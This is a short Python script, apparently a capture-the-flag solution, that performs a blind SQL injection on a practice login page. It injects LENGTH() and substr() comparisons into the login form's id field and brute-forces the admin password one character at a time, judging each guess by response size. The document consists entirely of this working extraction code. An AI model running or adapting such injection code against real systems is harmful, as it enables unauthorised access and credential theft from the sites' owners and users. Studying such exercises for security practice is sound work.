#!/usr/bin/python
# -*- Coding: utf-8 -*-

from bs4 import BeautifulSoup
import requests

login_url = "http://ctfq.sweetduet.info:10080/~q6/"

def main():
    flag = ""
    flag_length = 0

    for i in range(40):
        query = 'admin\' AND (SELECT LENGTH(pass) FROM user WHERE id = \'admin\') = {counter} --'.format(counter = i)
        
        payload = {
            'id': query,
            'pass': "ssss"
        }

        response = requests.post(login_url, data=payload)
        if len(response.text) > 2000:
            print("[*]length of flag = {flag_l}".format(flag_l=i))
            flag_length = i
        

    for i in range(flag_length):
        for c in range(33, 126):
            query = '\' or substr((SELECT pass FROM user WHERE id = \'admin\'), {flag_i}, 1) = \'{flag_c}\' --'.format(flag_i=(i + 1), flag_c=chr(c))
            #print(query)
            payload = {
                'id': query,
                'pass': "ssss"
            }

            response = requests.post(login_url, data=payload)
            if len(response.text) > 2000:
                print("[*]flag[{flag_i_}] = {flag_c}".format(flag_i_=(i + 1), flag_c=chr(c)))
                flag += chr(c)
                break


    print(flag)

                
if __name__ == "__main__":
    main()
